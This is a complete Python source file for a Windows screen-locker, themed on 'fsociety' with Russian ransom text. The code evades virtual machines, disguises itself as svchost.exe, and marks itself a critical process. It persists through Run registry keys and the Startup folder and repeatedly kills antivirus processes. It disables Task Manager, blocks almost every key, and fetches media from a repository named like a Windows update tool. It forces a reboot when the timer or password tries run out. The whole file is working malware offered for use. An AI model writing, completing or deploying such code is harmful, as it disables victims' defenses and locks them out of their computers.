import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk

try:
    ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
except: pass

def check_vm():
    vm_indicators = ["vbox", "vmware", "sandbox", "virtual", "qemu", "xen", "hyper-v", "vmsrvc"]
    try:
        for proc in subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().lower().split('\n'):
            for ind in vm_indicators:
                if ind in proc: return True
    except: pass
    return False

if check_vm(): sys.exit(0)

for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
    try: __import__(lib)
    except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

import cv2, pygame, keyboard, numpy as np, socket, re, winsound

PASS = "1601"
TRIES = 5
HOURS = 1
DELAY_MINUTES = 15
TEST_DELAY = 15
TEST_MODE = True
TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
ATTEMPTS_FILE = os.path.join(tempfile.gettempdir(), "attempts.dat")
VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
T = tempfile.gettempdir()
V = os.path.join(T, "v.mp4")
M = os.path.join(T, "m.mp3")

if os.path.exists(ATTEMPTS_FILE):
    try:
        with open(ATTEMPTS_FILE) as f: tries = int(f.read())
    except: tries = TRIES
else:
    tries = TRIES

def save_attempts():
    with open(ATTEMPTS_FILE, 'w') as f: f.write(str(tries))

FIRST_RUN_FLAG = os.path.join(tempfile.gettempdir(), "first_run.flag")

def is_first_run():
    if os.path.exists(FIRST_RUN_FLAG):
        return False
    else:
        with open(FIRST_RUN_FLAG, 'w') as f: f.write('1')
        return True

def protect_process():
    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except: pass

def dl(url, path):
    if os.path.exists(path) and os.path.getsize(path) > 10000: return True
    try:
        urllib.request.urlretrieve(url, path)
        if os.path.getsize(path) > 10000: return True
    except: pass
    try:
        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
        if os.path.getsize(path) > 10000: return True
    except: pass
    return False

def kill_av():
    avs = ["avast","avg","avira","bitdefender","kaspersky","mcafee","norton","eset","drweb","msmpeng","nis","bdagent","avp","MsMpEng","NisSrv","Sophos","Windefend","Defender"]
    while True:
        for av in avs:
            try: os.system(f"taskkill /f /im {av}.exe >nul 2>&1")
            except: pass
        time.sleep(0.1)

# ============================================================
# ПОЛНАЯ БЛОКИРОВКА КЛАВИАТУРЫ (ВООБЩЕ ВСЕ КЛАВИШИ)
# ============================================================
def block_all_keys():
    """Блокирует ВООБЩЕ ВСЕ клавиши — только Enter и Backspace работают в поле пароля"""
    # Реестр
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr"),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableLockWorkstation"),
        ]:
            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,1); winreg.CloseKey(r)
            except: pass
    
    # Блокируем все возможные клавиши
    all_keys = [
        'alt','left alt','right alt',
        'ctrl','left ctrl','right ctrl',
        'shift','left shift','right shift',
        'tab','caps lock','esc',
        'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
        'print screen','scroll lock','pause',
        'insert','home','end','page up','page down',
        'delete',
        'up','down','left','right',
        'windows','left windows','right windows',
        'apps','menu',
        'num lock','num pad 0','num pad 1','num pad 2','num pad 3','num pad 4',
        'num pad 5','num pad 6','num pad 7','num pad 8','num pad 9',
        'num pad *','num pad +','num pad -','num pad /','num pad .',
        'volume up','volume down','volume mute',
        'media next','media previous','media stop','media play/pause',
    ]
    for k in all_keys:
        try: keyboard.block_key(k)
        except: pass
    
    # Блокируем все комбинации
    combos = [
        'alt+f4','alt+tab','alt+esc','alt+space',
        'ctrl+shift+esc','ctrl+alt+del','ctrl+esc',
        'ctrl+w','ctrl+f4','ctrl+tab',
        'ctrl+c','ctrl+v','ctrl+x','ctrl+z','ctrl+a','ctrl+p','ctrl+s','ctrl+o','ctrl+n','ctrl+t',
        'win+d','win+r','win+e','win+l','win+m','win+x','win+tab',
        'win+ctrl+d','win+ctrl+f4',
        'win+1','win+2','win+3','win+4','win+5','win+6','win+7','win+8','win+9','win+0',
        'win+b','win+i','win+k','win+p','win+q','win+t','win+u','win+w',
        'win+shift+s','win+shift+m',
        'win+left','win+right','win+up','win+down',
        'win+home','win+space','win+enter',
    ]
    for c in combos:
        try: keyboard.add_hotkey(c, lambda:0, suppress=True)
        except: pass

def unlock_keys():
    try: keyboard.unhook_all()
    except: pass
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr"),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableLockWorkstation"),
        ]:
            try: r=winreg.OpenKey(h,k,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(r,n,0,winreg.REG_DWORD,0); winreg.CloseKey(r)
            except: pass

def timer_save():
    end = time.time() + HOURS*3600
    with open(TIMER,'w') as f: f.write(str(end))
    return end

def timer_get():
    try:
        with open(TIMER) as f: return float(f.read())
    except: return timer_save()

def timer_check():
    while True:
        if timer_get() - time.time() <= 0: destroy("404 | Time's up")
        time.sleep(5)

def destroy(msg="404 | Time's up"):
    show_final_screen(msg)
    os.system("shutdown /r /t 5 /f")
    os._exit(0)

def show_final_screen(msg):
    try:
        f = tk.Tk()
        f.attributes('-fullscreen', True); f.attributes('-topmost', True)
        f.configure(bg='black'); f.overrideredirect(True)
        f.protocol("WM_DELETE_WINDOW",lambda:None)
        f.bind("<Alt-F4>",lambda e:None); f.bind("<Escape>",lambda e:None)
        tk.Label(f, text=msg, bg='black', fg='#ff0000', font=('Courier', 40, 'bold')).pack(expand=True)
        tk.Label(f, text="Windows будет сброшена...", bg='black', fg='white', font=('Courier', 20)).pack()
        f.update(); time.sleep(3); f.destroy()
    except: pass

def startup():
    s = os.path.abspath(sys.argv[0])
    pw = sys.executable.replace("python.exe","pythonw.exe")
    try:
        r = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
        winreg.CloseKey(r)
    except: pass
    try:
        r = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
        winreg.CloseKey(r)
    except: pass
    try:
        d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
        shutil.copy2(s, d)
    except: pass

def anim():
    a=tk.Tk()
    a.attributes('-fullscreen',True); a.attributes('-topmost',True)
    a.configure(bg='black'); a.overrideredirect(True)
    a.protocol("WM_DELETE_WINDOW",lambda:None)
    # Блокируем ВСЕ возможные события закрытия
    for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>"]:
        a.bind(key, lambda e: None)
    a.focus_force()
    l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        l.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    s=tk.Label(a,text="",bg='black',fg='#ff4444',font=('Courier',22)); s.pack(pady=20)
    for i in range(len("тебя приветствует")+1):
        s.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

def video():
    if not dl(VIDEO_URL,V): return
    try:
        cap=cv2.VideoCapture(V)
        if not cap.isOpened(): return
        fps=cap.get(cv2.CAP_PROP_FPS) or 30
        cv2.namedWindow("FSOCIETY",cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("FSOCIETY",cv2.WND_PROP_FULLSCREEN,cv2.WINDOW_FULLSCREEN)
        while cap.isOpened():
            ret,frame=cap.read()
            if not ret: break
            cv2.imshow("FSOCIETY",frame)
            k = cv2.waitKey(int(1000/fps)) & 0xFF
            if k == 27 or k == ord('q') or k == ord('x'):
                pass  # Игнорируем Esc, Q, X
        cap.release(); cv2.destroyAllWindows()
        for _ in range(10): cv2.waitKey(1)
    except: pass

class Locker:
    def __init__(self):
        global tries
        self.r=tk.Tk(); self.r.withdraw()
        self.w=tk.Toplevel(self.r)
        self.w.attributes('-fullscreen',True); self.w.attributes('-topmost',True)
        self.w.configure(bg='black'); self.w.overrideredirect(True)
        self.w.protocol("WM_DELETE_WINDOW",lambda:None)
        # Блокируем ВСЕ события закрытия
        for key in ["<Alt-F4>","<Escape>","<Win_L>","<Win_R>","<Control-Alt-Delete>","<Alt-Tab>",
                     "<Control-Shift-Escape>","<Control-Escape>"]:
            self.w.bind(key, lambda e: None)
        self.w.focus_force()
        self.end=timer_get()
        self.tl=tk.Label(self.w,text="",bg='black',fg='#ff4444',font=('Courier',30,'bold'))
        self.tl.place(relx=0.5,rely=0.08,anchor='center')
        self.tick()
        try:
            if dl(MUSIC_URL,M):
                winsound.PlaySound(M, winsound.SND_ASYNC | winsound.SND_LOOP)
        except: pass
        msg=f"""Упс, кажется ты маленько влип.

Ну ладно, у тебя {TRIES} попыток и {HOURS} час.
Пароль лёгкий, он из 4 цифр.

Если попытки пройдут — Windows будет сброшена.
И да, не надо было скачивать игры из интернета.

Ну всё, пошёл нахуй.

И кстати, у меня есть твои пароли, логины,
доступ к роутеру и т.д.

ПОПЫТОК: {TRIES}
ТАЙМЕР: {HOURS} ЧАС"""
        tk.Label(self.w,text=msg,bg='black',fg='white',font=('Courier',11,'bold'),justify='center').place(relx=0.5,rely=0.45,anchor='center')
        cf=tk.Frame(self.w,bg='black'); cf.place(relx=0.5,rely=0.82,anchor='center')
        tk.Label(cf,text="ВВЕДИ ПАРОЛЬ:",bg='black',fg='#00ff00',font=('Courier',14,'bold')).pack(pady=(0,5))
        self.e=tk.Entry(cf,show="*",font=('Courier',14,'bold'),bg='#111',fg='#00ff00',relief='solid',bd=2)
        self.e.pack(pady=(0,5),ipadx=40,ipady=3)
        self.sl=tk.Label(cf,text=f"ОСТАЛОСЬ: {tries}",bg='black',fg='yellow',font=('Courier',12,'bold'))
        self.sl.pack()
        self.e.bind('<Return>',self.chk); self.e.focus_force()
        self.w.after(100,self.focus)
    
    def tick(self):
        r=self.end-time.time()
        if r<=0: destroy("404 | Time's up")
        h,m,s=int(r//3600),int((r%3600)//60),int(r%60)
        self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.w.after(1000,self.tick)
    
    def focus(self):
        try: self.w.focus_force(); self.e.focus_force(); self.w.after(100,self.focus)
        except: pass
    
    def chk(self,e=None):
        global tries
        if self.e.get()==PASS:
            try: winsound.PlaySound(None, 0)
            except: pass
            unlock_keys()
            self.sl.config(text="ВЕРНО!",fg='white'); self.w.update()
            try:
                os.remove(TIMER)
                os.remove(ATTEMPTS_FILE)
            except: pass
            time.sleep(1); self.r.destroy(); os._exit(0)
        else:
            tries-=1
            save_attempts()
            if tries>0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}",fg='white')
            else:
                try: winsound.PlaySound(None, 0)
                except: pass
                show_final_screen("505 | No attempts")
                destroy("505 | No attempts")
            self.e.delete(0,tk.END)

if __name__=="__main__":
    try:
        import win32console, win32gui
        ctypes.windll.user32.ShowWindow(win32console.GetConsoleWindow(), 0)
    except: pass
    
    protect_process()
    startup()
    threading.Thread(target=kill_av, daemon=True).start()
    threading.Thread(target=timer_check, daemon=True).start()
    
    # БЛОКИРУЕМ ВСЕ КЛАВИШИ СРАЗУ (до анимации)
    block_all_keys()
    
    if is_first_run():
        if TEST_MODE:
            time.sleep(TEST_DELAY)
        else:
            time.sleep(DELAY_MINUTES * 60)
        anim()
        video()
    
    Locker()
    tk.mainloop()
